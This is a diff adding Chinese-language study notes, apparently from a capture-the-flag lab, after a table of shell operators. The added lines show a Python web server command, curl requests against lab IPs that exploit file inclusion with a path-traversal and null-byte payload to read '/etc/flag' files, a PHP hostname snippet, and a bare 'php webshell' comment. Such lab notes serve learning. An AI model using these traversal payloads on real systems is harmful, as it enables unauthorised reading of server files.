@@ -20,3 +20,25 @@
 | &&  | 该运算符允许您将多个命令组合在终端的一行中。 |与“&”运算符不同，我们可以使用“&&”执行多个命令，例如`command1 && command2`。然而，值得注意的是，只有成功command2后才会运行command1 |
 | >  | 该运算符是一个重定向器 - 这意味着我们可以从命令中获取输出（例如使用 cat 输出文件）并将其定向到其他地方。 | 假设我们想创建一个名为“welcome”的文件，其中包含消息“hey”。我们可以`echo hey > welcome`在我们想要创建内容为“hey”的文件的地方运行。  注意：如果“welcome”文件已存在，则内容将被覆盖！
 | >>  | 该运算符执行与该运算符相同的功能`>`，但附加输出而不是替换（意味着没有任何内容被覆盖）。 |
+
+
+
+
+3.起一个web服务
+> python3 -m http.server 4444
+
+4.curl命令
+> curl -X POST http://10.10.7.7/challenges//chall1.php -d 'method=GET&file=/etc/flag1'
+
+curl -X POST http://10.10.189.219/challenges//chall3.php -d 'method=POST&file=../../../../etc/flag3%00' --output -
+
+php输出主机名
+```php
+<?php
+// 获取并输出主机名
+$hostname = php_uname('n');
+echo "Hostname: $hostname";
+?>
+ ```
+
+ // php webshell
